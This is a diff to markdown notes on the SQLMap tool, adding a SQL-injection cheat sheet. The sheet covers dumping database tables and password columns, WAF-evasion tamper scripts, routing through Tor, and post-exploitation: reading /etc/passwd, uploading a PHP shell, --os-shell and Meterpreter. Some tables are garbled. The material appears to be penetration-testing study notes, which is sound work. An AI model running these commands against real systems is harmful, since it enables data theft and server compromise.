@@ -19,12 +19,14 @@ The --dbs flag helps you to extract all the database names. Once you get to know
 the database names, you can extract information about the tables of that
 database by using -D database_name --tables.
 
+```bash
 -D database_name -T table_name --dump
+```
 
-f you see any web application using GET parameters in the URLs to retrieve data,
-you can test that URL with the -u flag in the SQLMap tool. This is considered to
-be HTTP GET-based testing. This approach is followed when the application uses
-GET parameters in the URL to retrieve data from the searches.
+if you see any web application using GET parameters in the URLs to retrieve
+data, you can test that URL with the -u flag in the SQLMap tool. This is
+considered to be HTTP GET-based testing. This approach is followed when the
+application uses GET parameters in the URL to retrieve data from the searches.
 
 URLs that have GET parameters can be vulnerable to SQL injection; let us scan
 this URL to identify if it has any SQL injection vulnerability.
@@ -81,3 +83,284 @@ SQLMap tool to discover SQL injection vulnerabilities inside it and exploit it.
 ```bash
 sqlmap -u 'http://10.64.129.84/ai/includes/user_login?email=test&password=test' --dbs
 ```
+
+## Full Workflow
+
+### 🛡️ SQLMap Quick-Copy Cheat Sheet
+
+#### 1. Core Workflow (GET vs POST)
+
+##### 🌐 GET Method (URL Parameters)
+
+```bash
+# 1. Find Databases
+sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" --dbs --batch
+
+# 2. List Tables
+sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" -D <db_name> --tables --batch
+
+# 3. Dump Data
+sqlmap -u "[http://site.com/id=1](http://site.com/id=1)" -D <db_name> -T <table_name> --dump --batch
+```
+
+##### 📩 POST Method (Request Files)
+
+Save your intercepted request as request.txt first.
+
+```bash
+# 1. Find Databases
+
+sqlmap -r request.txt --dbs --batch
+
+# 2. List Tables
+
+sqlmap -r request.txt -D <db_name> --tables --batch
+
+# 3. Dump Data
+
+sqlmap -r request.txt -D <db_name> -T <table_name> --dump --batch
+```
+
+#### 2. Authentication & Sessions
+
+```bash
+| Goal       |                        Flag                        |
+|-------     |----------------------------------------------------|
+|Cookies     |           "--cookie=""PHPSESSID=12345"""           |
+|Headers     |        "-H ""X-Forwarded-For: 127.0.0.1"""         |
+|Login Creds |"--auth-type Basic --auth-cred ""user:pass"""       |
+
+```
+
+#### 🛡️ 3. Bypassing Firewalls (WAF)
+
+##### Stealth Combo
+
+```bash
+--random-agent --tamper=space2comment,randomcase,charencode
+```
+
+Common Tampers:
+
+```bash
+space2comment : Replaces spaces with /\*\*/
+
+randomcase : Changes SELECT to sElEcT
+
+equaltolike : Changes = to LIKE
+
+```
+
+#### 🕵️ 4. Proxy & Anonymity
+
+```bash
+
+# Route through Burp Suite
+--proxy="[http://127.0.0.1:8080](http://127.0.0.1:8080)"
+
+# Route through Tor
+--tor --check-tor
+
+```
+
+#### ⚡ 5. Essential Shortcuts
+
+```bash
+
+|    Flag    |              Description              |
+|------------|---------------------------------------|
+|  --batch   |  Skip all prompts (chooses default).  |
+|--threads=10|       Maximum extraction speed.       |
+| --level=5  |Check Headers & Cookies for injection. |
+|  --risk=3  |  Use more aggressive/risky payloads.  |
+| --os-shell |    Attempt to get a command shell.    |
+|--file-read |   "Read files (e.g. /etc/passwd)."    |
+
+
+```
+
+#### 🛠️ 6. Useful One-Liners
+
+```bash
+
+# Scan a specific parameter ONLY (e.g., 'id')
+sqlmap -u "[http://site.com/id=1&user=test](http://site.com/id=1&user=test)" -p id --dbs
+
+# Beginner Wizard Mode
+sqlmap --wizard
+
+```
+
+#### 🎯 7. Targeting Specific Parameters
+
+Use these to save time and reduce the number of "noisy" requests sent to the
+server.
+
+The -p Flag (Explicit Targeting) Instead of letting SQLMap guess, tell it
+exactly which parameter to attack.
+
+```bash
+
+# Only test the 'id' parameter, ignore 'session' or 'lang'
+sqlmap -u "http://site.com/view.php?id=1&lang=en&session=99" -p id --dbs
+
+```
+
+The Custom Injection Point (_) If the URL is "pretty" (RESTful) or the injection
+is in a weird spot (like a header), use an asterisk_ to mark the spot.
+
+```bash
+
+# Pretty URL injection
+sqlmap -u "http://site.com/user/101*/profile" --dbs
+
+# Header injection (User-Agent)
+sqlmap -u "http://site.com/" --user-agent="MyBrowser*" --dbs
+
+```
+
+#### ⚡ 8. Advanced Data Extraction Filters
+
+Once you've found the tables, you don't always need to dump the entire database.
+
+| Goal                    | Command                                      |
+| ----------------------- | -------------------------------------------- |
+| Dump Specific Columns   | "-D db -T users -C ""user,password"" --dump" |
+| Dump First 5 Rows       | --start 1 --stop 5                           |
+| Search for Table Names  | "--search -T ""admin"""                      |
+| Search for Column Names | "--search -C ""pass""                        |
+
+##### 🚀 The "Panic" Command
+
+If you are in a rush and need a result now, use this "Aggressive One-Liner":
+
+```bash
+sqlmap -u "URL" --batch --threads=10 --level=3 --risk=2 --random-agent --dbms=MYSQL
+```
+
+#### 🛠️ 9. Common Errors & Troubleshooting
+
+❌ Error: "Target URL appears not to be injectable" If you are sure it is
+vulnerable but SQLMap fails, try these:
+
+Increase Level/Risk: sqlmap -u [URL] --level=5 --risk=3
+
+Use a Tamper Script: The WAF might be blocking standard payloads. Try
+--tamper=space2comment.
+
+Check the Cookie: Your session might have expired. Refresh your browser and copy
+the new cookie.
+
+❌ Error: "Connection timed out" or "403 Forbidden" Add a Delay: The server
+might have rate-limiting. Use --delay=1 or --delay=2.
+
+Change User-Agent: Use --random-agent. Some sites block the default User-Agent:
+sqlmap.
+
+Use a Proxy: Your IP might be temporarily soft-blocked. Use --proxy.
+
+❌ Error: "Internal Server Error (500)" This often means the SQL injection is
+working but crashing the query. Try using a specific DBMS flag to make the
+payloads cleaner: --dbms=mysql (or postgresql, mssql).
+
+#### 🛑 10. Post-Exploitation (File & OS Access)
+
+If the database user has high privileges (like 'root' or 'sa'), you can go
+beyond data theft.
+
+| Command                       | Action                                                               |
+| ----------------------------- | -------------------------------------------------------------------- |
+| "--file-read=""/etc/passwd""" | Read a system file from the server.                                  |
+| "--file-write=""shell.php""   | --file-dest=""/var/www/html/""" Upload a file to the                 |
+| web                           | directory. --os-shell Attempt to gain an interactive command prompt. |
+| --os-pwn                      | Attempt to spawn a Meterpreter shell (requires Metasploit).          |
+
+#### 📋 The "Complete Checklist" One-Liner
+
+If you want to run a thorough scan with every "best practice" enabled:
+
+```bash
+sqlmap -u "http://target.com/id=1" --batch --random-agent --level=3 --risk=2 --threads=5 --dbs
+```
+
+This command is essentially the "Advanced Standard" for professional scanning.
+It balances speed, stealth, and thoroughness.
+
+Here is the breakdown of each component:
+
+sqlmap The base command that launches the tool.
+
+```bash
+-u "<http://target.com/id=1>" The Target: Specifies the URL to test.
+```
+
+Tip: Always wrap the URL in double quotes. This prevents the terminal from
+misinterpreting special characters like & or ? as shell commands.
+
+```bash
+--batch
+```
+
+Automate Everything: Tells SQLMap to never ask for user input. It will
+automatically choose the default/recommended option for every question (e.g.,
+"Do you want to skip testing other parameters?").
+
+Use Case: Perfect for running scans in the background or within scripts.
+
+```bash
+--random-agent
+```
+
+Stealth: SQLMap's default identity is often blocked by Firewalls. This flag
+picks a real, random browser identity (like Chrome on Windows or Safari on Mac)
+for every session.
+
+Result: It makes your automated traffic look like a human visitor.
+
+```bash
+--level=3
+```
+
+Depth of Search: By default (Level 1), SQLMap only tests URL parameters.
+
+Level 3 expands the search to include HTTP Headers (like Referer) and Cookies.
+This is crucial because many modern vulnerabilities are hidden in session data
+rather than the URL.
+
+```bash
+--risk=2
+```
+
+Payload Intensity: Level 1 is safe and quiet.
+
+Risk 2 adds heavy query-based tests (like OR-based injections). While more
+effective, it carries a small risk of accidentally updating or changing data in
+the database. Use with caution on live production sites.
+
+```bash
+--threads=5
+```
+
+Performance: SQLMap usually sends one request at a time. This tells it to send 5
+requests simultaneously.
+
+Result: It makes data extraction significantly faster.
+
+Note: Avoid going above 10, as it may crash the web server or trigger a DDoS
+alarm.
+
+```bash
+--dbs
+```
+
+The Objective: This is the action flag. It tells SQLMap: "If you find a hole,
+don't just stop—list all the database names you can find."
+
+| Flag | Category | Purpose ||
+|------------------------------------------------------------------||
+|------------------------------------------------------------------|| | -u
+|Targeting | Where to attack. || | --batch |Automation| Hands-free operation. ||
+|--random-agent |Stealth |Bypass basic User-Agent filters.|| | --level=3 | Depth
+| Scan Headers and Cookies. || | --risk=2 |Intensity | Use more aggressive
+payloads. || | --threads=5 | Speed | Faster data retrieval. || | --dbs |Goal
+|Enumerate all databases. || | || | ||
